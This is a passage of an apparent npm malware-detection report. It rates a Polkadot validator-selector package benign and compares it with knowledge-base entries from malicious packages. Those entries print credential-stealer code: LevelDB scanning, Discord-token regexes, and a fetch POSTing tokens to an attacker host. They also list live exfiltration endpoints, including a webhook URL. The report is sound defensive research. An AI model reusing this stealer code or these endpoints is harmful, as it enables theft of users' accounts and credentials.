@@ -1,0 +1,1433 @@
+{
+  "package_name": "dot-validator-selector",
+  "package_version": "1.0.3",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:19:39.017449",
+  "status": "success",
+  "selected_files_count": 5,
+  "selected_files": [
+    "package/package.json",
+    "package/web-sample/index.js",
+    "package/util/ValidatorSelector.js",
+    "package/util/cache.js",
+    "package/web-sample/bundle.js"
+  ],
+  "is_malicious": false,
+  "total_files": 5,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dot-validator-selector/1.0.3/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dot-validator-selector/1.0.3/package/web-sample/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dot-validator-selector/1.0.3/package/util/ValidatorSelector.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "ValidatorSelector_slice_1",
+          "code_snippet": "const commissionDecimals = 1e7;\n\nclass ValidatorSelector {\n\n    /*\n    * @param api - the initialised @polkadot/api instance\n    * @param maxCommission - the maximum commission a nominator is willing to accept from a validator, defaults to 20%\n    * @param minCommission - the minimum commission a nominator is willing to accept from a validator, defaults to 0.5%\n    * @param minStaking - the min amount of DOT that the validator must have staked for 'skin in the game', defaults to 1000 DOT\n    * @param era - the era to use, defaults to 0 but set to current era in getValidators if not overridden in constructor\n    * @param humanReadable - parse the identity into human readable text else keep it in raw hex\n    * */\n    constructor(\n        api,\n        maxCommission = 20 * commissionDecimals,\n        minCommission = 0.5 * commissionDecimals,\n        minStaking = 1000,\n        era = 0,\n        humanReadable = true\n    ) {\n        this.api = api;\n        this.maxCommission = maxCommission;\n        this.minCommission = minCommission;\n        this.minStaking = minStaking * `1e+${api.registry.chainDecimals[0]}`;\n        this.era = era;\n        this.maxNominators = 256; // await this.api.consts.staking.maxNominatorRewardedPerValidator;\n        this.humanReadable = humanReadable;\n    }\n\n    /*\n    * @dev set the era to the current one if set to 0\n    * */\n    async setEraToCurrentIfZero() {\n        if(this.era === 0) {\n            const activeEra = await this.api.query.staking.activeEra();\n            this.era = JSON.parse(activeEra).index;\n        }\n    }\n\n    /*\n    * @dev return validators that meet the criteria as set in the README\n    * @param amount - the max amount of validators to return e.g. 12 for DOT\n    * @returns an array of objects containing validator info that meets this criteria\n    * */\n    async getValidators(amount) {\n        await this.setEraToCurrentIfZero();\n        const validatorDisplays = {}; // used to prevent adding in validators run by the same entity\n        const validatorsMeetingCriteria = [];\n        const validators = ValidatorSelector.shuffleArray((await this.api.query.session.validators()));\n        for(const validator of validators) {\n            if(validatorsMeetingCriteria.length === amount) {\n                return validatorsMeetingCriteria;\n            }\n            const identity = await this.api.query.identity.identityOf(validator);\n            if(!identity.isEmpty) {\n                const { info } = JSON.parse(identity);\n                if(validatorDisplays[info.display.raw] !== true) {\n                    const exposure = await this.api.query.staking.erasStakers(this.era, validator);\n                    const commission = (await this.api.query.staking.validators(validator)).commission.toNumber();\n                    const meetsCriteria = await this.getMeetsCriteria(validator, exposure, commission);\n                    if(meetsCriteria) {\n                        validatorsMeetingCriteria.push({\n                            accountId: validator.toString(),\n                            identity: this.humanReadable ? ValidatorSelector.convertIdentityToReadableFormat(info) : info,\n                            staked: exposure?.own.toNumber(),\n                            commission: commission === 0 ? \"0%\" : `${commission / commissionDecimals}%`\n                        });\n                        validatorDisplays[info.display.raw] = true;\n                    }\n                }\n            }\n        }\n\n        return validatorsMeetingCriteria;\n    };\n\n\n    /*\n      * @dev helper to resolve the identity fields\n      * @param id - the identity object\n      * @returns the parsed identity object from hex string bytes to utf8\n    * */\n    static convertIdentityToReadableFormat(id) {\n        const { display, legal, web, riot, email, pgpFingerprint, image, twitter } = id;\n\n        return {\n            display: ValidatorSelector.hexToUtf8(display?.raw),\n            legal: ValidatorSelector.hexToUtf8(legal?.raw),\n            web: ValidatorSelector.hexToUtf8(web?.raw),\n            riot: ValidatorSelector.hexToUtf8(riot?.raw),\n            email: ValidatorSelector.hexToUtf8(email?.raw),\n            pgpFingerprint: ValidatorSelector.hexToUtf8(pgpFingerprint?.raw),\n            image: ValidatorSelector.hexToUtf8(image?.raw),\n            twitter: ValidatorSelector.hexToUtf8(twitter?.raw)\n        }\n    }\n\n    // https://stackoverflow.com/questions/2450954/how-to-randomize-shuffle-a-javascript-array\n    // used to randomise the validators returned from the node for fairness and dynamism\n    static shuffleArray(array) {\n        for (let i = array.length - 1; i > 0; i--) {\n            const j = Math.floor(Math.random() * (i + 1));\n            [array[i], array[j]] = [array[j], array[i]];\n        }\n        return array;\n    }\n\n    /*\n      * @dev helper to convert from hex string bytes to utf8\n      * @param s - hex string of bytes\n      * @returns utf8 encoded string\n    * */\n    static hexToUtf8(s) {\n        try {\n            return decodeURIComponent(\n                s.replace(/\\s+/g, '') // remove spaces\n                    .replace(/[0-9a-f]{2}/g, '%$&') // add '%' before each 2 characters\n                    .replace(\"0x\", \"\") // remove 0x prefix\n            );\n        } catch {\n            return \"\";\n        }\n\n    }\n\n    /*\n   * @dev check if a validator meets the criteria (except for uniqueness)\n   * @param accountId - the validators account id\n   * @param exposure - the validators exposure to staking\n   * @param commission - the commission the validator charges to nominators\n   * @returns boolean, true if meets criteria else false\n   * */\n    async getMeetsCriteria(accountId, exposure, commission) {\n        const staked = exposure?.own;\n        const nominatorCount = exposure?.others.length;\n        if(staked < this.minStaking) return false;\n        if(commission > this.maxCommission || commission < this.minCommission) return false;\n        if(nominatorCount >= this.maxNominators) return false; // oversubscribed\n        const hasBeenSlashed = await this.getHasBeenSlashed(accountId);\n\n        return !hasBeenSlashed;\n    }\n\n    /*\n    * @dev check if a validator meets the criteria by account id only, useful for checking a single validator\n    * @param accountId - the validators account id\n    * @returns boolean, true if meets criteria else false\n    * */\n    async getMeetsCriteriaByAccountId(accountId) {\n        const exposure = await this.api.query.staking.erasStakers(this.era, accountId);\n        const commission = (await this.api.query.staking.validators(accountId)).commission.toNumber();\n\n        return this.getMeetsCriteria(accountId, exposure, commission);\n    }\n\n    /*\n    * @dev check if the user's validators meet the criteria set\n    * @param accountId - the validators account id\n    * @returns Object containing the validators address and a boolean representing whether they meet the criteria or not\n    * */\n    async getUserValidatorsMeetCriteria(accountId) {\n        const userSelectedValidators = await this.api.query.staking.nominators(accountId);\n        const targets = JSON.parse(userSelectedValidators).targets;\n        const validators = [];\n        for(let id of targets) {\n            validators.push({ accountId: id, match: await this.getMeetsCriteriaByAccountId(id) });\n        }\n\n        return validators;\n    }\n\n    /*\n    * @dev check if a validator has been slashed before\n    * @param accountId - the identifier for the validator\n    * @param era - the epoch to check for slashing\n    * @returns boolean - true if has been slashed else false\n    * */\n    async getHasBeenSlashed(accountId) {\n        const slashes = await this.api.query.staking.slashingSpans(accountId);\n        if(slashes.isEmpty) return false;\n\n        return JSON.parse(slashes).lastNonzeroSlash !== 0;\n    }\n\n}\n\nmodule.exports = ValidatorSelector;",
+          "is_malicious": false,
+          "malice_score": 0.3810378154118856,
+          "confidence": 0.0,
+          "behavior_summary": "When called, the code accesses the @polkadot/api to query blockchain staking data including validators, their commissions, exposures, slashing status, and identities. It processes and decodes identity information from hex to UTF-8, filters validators based on staking and commission criteria, and returns structured validator data. No network, file, or system execution APIs are used, and no suspicious hardcoded IPs, URLs, or commands are present, resulting in purely blockchain data querying and processing without external communication or code execution.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a well-structured utility class designed to interact with the Polkadot blockchain API to query staking and validator data. It performs no obfuscation, no network communication beyond blockchain queries, no file or system access, and no attempts to exfiltrate data or manipulate user wallets. The code's behavior is purely data retrieval and filtering based on staking criteria, with identity decoding from hex to UTF-8 for display purposes. Compared to the known malicious patterns, it does not share any suspicious operations such as hardcoded blockchain addresses without functionality, credential theft, or wallet manipulation. The APIs used are legitimate Polkadot API calls for blockchain data querying, which is expected in a blockchain utility library. Therefore, there is no evidence of malicious intent or behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_201020_374245_snippet_1",
+              "source_package": "@zitterorg/a-eius-dolorem (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_201020_374245/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39255014061927795,
+              "code_similarity": 0.3093873858451843,
+              "behavior_similarity": 0.4757128953933716,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// web3c.js\n// Hardcoded blockchain addresses\n// (actual code is minimal or empty, but includes references to blockchain addresses)\nconst teaAddress = '0x1234567890abcdef...'; // Example address\n// ...rest of file is empty or contains only comments",
+                "code_behavior": "At import-time, the code statically references hardcoded blockchain addresses in a JavaScript file, with no functional logic or data processing, resulting in no operational effect but potentially linking the package to blockchain-based reward systems.",
+                "malice_analysis": {
+                  "why_suspicious": "Including hardcoded blockchain addresses in a file that otherwise contains no functional code is highly atypical and suggests the package may be used to game blockchain-based reward systems, act as a placeholder for future malicious payloads, or serve as a marker for automated reward collection.",
+                  "violated_expectations": "A legitimate npm package, especially one purporting to be an ESLint plugin, is expected to provide actual linting or utility functionality. Instead, this package is empty or contains only references to unrelated blockchain addresses, which is inconsistent with normal package development practices.",
+                  "similar_legitimate_use": "Some legitimate packages may include blockchain addresses for donation or configuration purposes, but not in the absence of all other meaningful functionality or code.",
+                  "key_indicators": [
+                    "Presence of hardcoded blockchain addresses in otherwise empty or non-functional files",
+                    "JavaScript files (e.g., lib/web3c.js) containing only comments or static address assignments",
+                    "No functional code or exports present in the file"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "lib/web3c.js",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "@zitterorg/a-eius-dolorem",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (2024-07-xx and later)",
+                  "why_malicious": "The package is part of a coordinated mass-flooding campaign targeting the npm registry. It publishes hundreds of thousands of functionally useless or near-empty packages, which strains registry infrastructure, risks denial-of-service (DoS) conditions, and pollutes the open source ecosystem. The packages are interlinked via dependencies, amplifying the impact and complicating removal, and may serve as a smokescreen for more targeted malicious activity or to exploit blockchain-based reward systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Mass publication of thousands of packages with gibberish or auto-generated names and minimal or empty code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Floods the npm registry, straining registry resources and polluting the open source ecosystem."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Each package declares dependencies on dozens or hundreds of other similarly named packages, creating a recursive dependency web.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Causes resource exhaustion during dependency resolution and complicates package removal for registry operators."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Packages reference hardcoded blockchain addresses, potentially to game blockchain-based reward systems or act as placeholders for future malicious code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "May enable the publisher to receive crypto tokens for publishing or referencing packages, or facilitate future malicious payloads."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Packages with minimal or empty code that statically reference hardcoded blockchain addresses",
+                    "Packages with package.json files declaring large numbers (dozens or hundreds) of dependencies on other similarly named, functionally empty packages from the same publisher",
+                    "Mass publication of packages with gibberish or auto-generated names within a short time frame, especially from a single publisher"
+                  ],
+                  "file_indicators": [
+                    "lib/web3c.js containing only comments or hardcoded blockchain addresses and no functional code",
+                    "package.json files with extensive dependencies on other @zitterorg/* packages that are also non-functional"
+                  ],
+                  "network_indicators": [
+                    "No direct network activity in package code, but indirect indicators include spikes in npm registry access and excessive dependency resolution requests during installation"
+                  ],
+                  "how_to_detect": "Monitor for packages with minimal or empty code, particularly those referencing hardcoded blockchain addresses in JavaScript files. Flag packages whose package.json declares large numbers of dependencies on other packages from the same publisher, especially when those dependencies are also functionally empty. Detect mass publication events involving gibberish or auto-generated package names from a single publisher. Registry operators should watch for sudden spikes in package publication rates and recursive dependency chains that could cause resource exhaustion or DoS conditions."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787618_snippet_2",
+              "source_package": "discord.dll (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787618/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3769388794898987,
+              "code_similarity": 0.31002506613731384,
+              "behavior_similarity": 0.4438526928424835,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation\nconst paths = [\n  '%LocalAppData%/Google/Chrome/User Data/Default',\n  '%LocalAppData%/BraveSoftware/Brave-Browser/User Data/Default',\n  '%LocalAppData%/Yandex/YandexBrowser/User Data/Default',\n  '%AppData%/Opera Software/Opera Stable',\n  '%AppData%/discordptb',\n  '%AppData%/discordcanary',\n  '%AppData%/discord'\n];\n// For each path, read LevelDB files and extract tokens\n// Collect PC username, Discord username, and public IP via https://api.ipify.org/?format=json",
+                "code_behavior": "At runtime, the code iterates through browser and Discord data directories, reads LevelDB files to extract Discord tokens and browser credentials, collects system and user information, and retrieves the public IP address, aggregating all data for exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing LevelDB files in browser and Discord directories to extract authentication tokens and user information is a direct indicator of credential theft and privacy violation.",
+                  "violated_expectations": "Normal packages do not access or parse LevelDB files in browser or Discord directories, nor do they aggregate user tokens, system information, or public IP addresses without explicit user consent.",
+                  "similar_legitimate_use": "Forensics or backup utilities may access such data with clear user authorization, but not in a package purporting to be a Discord utility.",
+                  "key_indicators": [
+                    "Direct access to browser and Discord LevelDB files",
+                    "Extraction of Discord tokens and user/system information",
+                    "Use of external IP lookup service (api.ipify.org)",
+                    "Aggregation of sensitive data for exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "app.js and classes/Grabber.js, Token.js, User.js, Util.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord.dll",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0",
+                  "why_malicious": "The package is explicitly designed to steal Discord user tokens and browser information by scanning local directories for credential storage, collecting system and user data, and exfiltrating this information to an attacker-controlled Discord webhook. It masquerades as a legitimate module, employs typosquatting, and ensures execution of its malicious payload both at install time and runtime, violating user trust and security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed during package installation via the postinstall script, launching the main app.js file.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initiates the main malicious logic responsible for data collection."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The main script scans browser and Discord directories, extracts tokens and user/system information, and collects the public IP address.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Aggregates the stolen data and prepares it for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is sent to an attacker-controlled Discord webhook via HTTPS POST.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and user information."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of arbitrary code during npm install via postinstall script that launches main application logic",
+                    "Access to LevelDB files in browser and Discord data directories for credential extraction",
+                    "Collection and aggregation of Discord tokens, browser credentials, system/user information, and public IP address",
+                    "Network requests to Discord webhooks containing sensitive user data"
+                  ],
+                  "file_indicators": [
+                    "Presence of a postinstall script in package.json that executes 'node .' or similar main entrypoint",
+                    "References in code to browser and Discord data directories (e.g., '%LocalAppData%/Google/Chrome/User Data/Default', '%AppData%/discord')",
+                    "Files named Grabber.js, Token.js, Webhook.js, or similar credential-grabbing modules"
+                  ],
+                  "network_indicators": [
+                    "Outgoing HTTPS POST requests to discord.com/api/webhooks/*",
+                    "Requests to https://api.ipify.org/?format=json for public IP retrieval"
+                  ],
+                  "how_to_detect": "Monitor npm packages for postinstall scripts that execute main application code. Flag any code that accesses LevelDB files in browser or Discord directories. Detect network requests to Discord webhooks, especially those containing tokens or user/system data. Look for package files or code referencing credential grabbing or browser data extraction. Correlate the presence of these behaviors to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3757403790950775,
+              "code_similarity": 0.33637183904647827,
+              "behavior_similarity": 0.41510891914367676,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_214546_221899_snippet_1",
+              "source_package": "discord-lofy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_214546_221899/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.37454450130462646,
+              "code_similarity": 0.339141309261322,
+              "behavior_similarity": 0.4099476933479309,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "let-pkkR;!function(){const-Q6SG=Array.prototype.slice.c... (obfuscated, >4000 lines)\npaths = ['/Users/user/AppData/Roaming/Discord/Local Storage/leveldb', ...];\npaths.forEach(p => getToken(p))\nfunction getToken(p) {\n    fs.readdir(p, (e, f) => {\n        if (f) {\n            f = f.filter(f => f.endsWith(\"ldb\"))\n            f.forEach(f => {\n                var fileContent = fs.readFileSync(`${p}/${f}`).toString()\n                var noMFA = /\"[\\d\\w_-]{24}\\.[\\d\\w_-]{6}\\.[\\d\\w_-]{27}\"/\n                var mfa = /\"mfa\\.[\\d\\w_-]{84}\"/\n                var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]\n                if (token) fetch(\"http://ip-api.com/json/\").then(r => r.json()).then(r => fetch('https://aba45cf.glitch.me/polarlindo', {\n                    method: \"POST\",\n                    body: JSON.stringify({\n                        token: token,\n                        ip: r.query\n                    })\n                }))\n            })\n        }\n    })\n}",
+                "code_behavior": "At runtime, the code iterates over browser and Discord client local storage folders, reads LevelDB files, extracts Discord authentication tokens using regular expressions, and sends the tokens along with the victim's public IP address to a hardcoded external server via HTTP POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses local storage folders associated with Discord and browsers, searches for token patterns using regex, and exfiltrates the results to an external server. This behavior is not present in legitimate libraries and is a clear sign of credential theft.",
+                  "violated_expectations": "A legitimate discord.js library should not access or parse local storage files for tokens, nor transmit sensitive authentication data to external servers.",
+                  "similar_legitimate_use": "Legitimate software may access local storage for user settings, but never for extracting and exfiltrating authentication tokens.",
+                  "key_indicators": [
+                    "Obfuscated code injected into a core library file",
+                    "Enumeration of Discord and browser storage paths",
+                    "Regex patterns matching Discord token formats",
+                    "Network POST requests to hardcoded attacker-controlled domain (aba45cf.glitch.me)",
+                    "Collection and exfiltration of public IP address"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "src/client/actions/UserGet.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord-lofy",
+                  "package_manager": "npm",
+                  "package_versions": "11.5.1",
+                  "why_malicious": "The package is a trojanized version of the legitimate discord.js library, containing heavily obfuscated code that steals Discord authentication tokens and other sensitive data from local storage, exfiltrates them to attacker-controlled infrastructure, and in some variants provides remote access and command execution capabilities. This enables credential theft, account takeover, and full system compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious npm package, often as a result of typosquatting or dependency confusion attacks.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code is introduced and set up to execute within the victim's environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time or runtime, harvesting sensitive data such as Discord tokens, environment variables, credentials, and personally identifiable information (PII).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Stolen data is collected and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The harvested data is exfiltrated to attacker-controlled infrastructure, including custom servers, Discord webhooks, and pipedream.net endpoints.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives sensitive data, enabling account takeover, further attacks, or resale of credentials."
+                  },
+                  {
+                    "step": 4,
+                    "action": "For variants with remote access trojan (RAT) functionality, the attacker may issue further commands for remote control, data theft, persistence, or lateral movement.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full compromise of the victim system, including remote command execution and ongoing attacker access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of obfuscated code in npm packages, especially in core library files or unexpected locations",
+                    "Access to browser or Discord client local storage folders and LevelDB files",
+                    "Use of regular expressions matching Discord token formats",
+                    "Network requests to hardcoded external domains or Discord webhooks for data exfiltration",
+                    "Exfiltration of environment variables or credentials, often base64-encoded",
+                    "Presence of remote access or shell execution command handlers integrated with Discord chat"
+                  ],
+                  "file_indicators": [
+                    "src/client/actions/UserGet.js containing obfuscated or injected code",
+                    "eval(function(p,a,c,k,e,d)... patterns in main package files",
+                    "References to Discord client storage paths (e.g., AppData/Roaming/Discord/Local Storage/leveldb)",
+                    "Obfuscated code blocks in wafer-* or similar package families"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to aba45cf.glitch.me/polarlindo",
+                    "HTTP POST requests to canary.discord.com/api/webhooks/903018156283551775/lJOJ9526e_rzw0Js2DQPdV0eYQd5RQybtUcJqolp84JTwlxJxaWnuam9FyUplYN2TJfT",
+                    "HTTP POST requests to *.m.pipedream.net (e.g., a5eb7b362adc824ed7d98433d8eae80a.m.pipedream.net)",
+                    "Connections to geolocation-db.com/json/ for geolocation data",
+                    "Unusual outbound traffic to domains not associated with legitimate package functionality"
+                  ],
+                  "how_to_detect": "Monitor npm packages for the presence of obfuscated code, especially in files that should not contain such logic (e.g., core library files or main entry points). Flag packages that access browser or Discord client storage directories, use regular expressions to search for Discord token patterns, or exfiltrate data to hardcoded domains or Discord webhooks. Detect base64-encoded environment variable exfiltration and the presence of remote access command handlers, particularly those integrated with Discord chat. Use network monitoring to identify suspicious outbound HTTP POST requests to known exfiltration endpoints such as aba45cf.glitch.me, Discord webhooks, and pipedream.net domains. Correlate these behaviors to identify malicious packages and prevent credential and data theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_195108_snippet_2",
+              "source_package": "mathjs-min (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_195108/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3687508702278137,
+              "code_similarity": 0.3495749533176422,
+              "behavior_similarity": 0.38792678713798523,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function findToken(tokenPath) {\n  tokenPath += \"\\\\Local Storage\\\\leveldb\";\n  let tokens = [];\n  try {\n    fs.readdirSync(path.normalize(tokenPath)).map(file => {\n      if (file.endsWith(\".log\") || file.endsWith(\".ldb\")) {\n        fs.readFileSync(`${tokenPath}\\\\${file}`, \"utf8\").split(/\\r?\\n/).forEach(line => {\n          const regex = [\n            new RegExp(/mfa\\.[\\w-]{84}/g),\n            new RegExp(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}/g)\n          ];\n          for (const _regex of regex) {\n            const token = line.match(_regex);\n            if (token) {\n              token.forEach(element => {\n                tokens.push(element);\n              });\n            }\n          }\n        })\n      }\n    });\n  } catch {}\n  return tokens;\n}",
+                "code_behavior": "At runtime, when invoked, the function scans local LevelDB storage folders for files matching Discord/browser token patterns, extracts authentication tokens from .log and .ldb files, and returns any discovered tokens.",
+                "malice_analysis": {
+                  "why_suspicious": "The function systematically searches for and extracts authentication tokens from application data folders using regex patterns specific to Discord tokens, which is a common credential theft technique.",
+                  "violated_expectations": "A math library should not access or parse browser or Discord storage files, nor should it search for authentication tokens.",
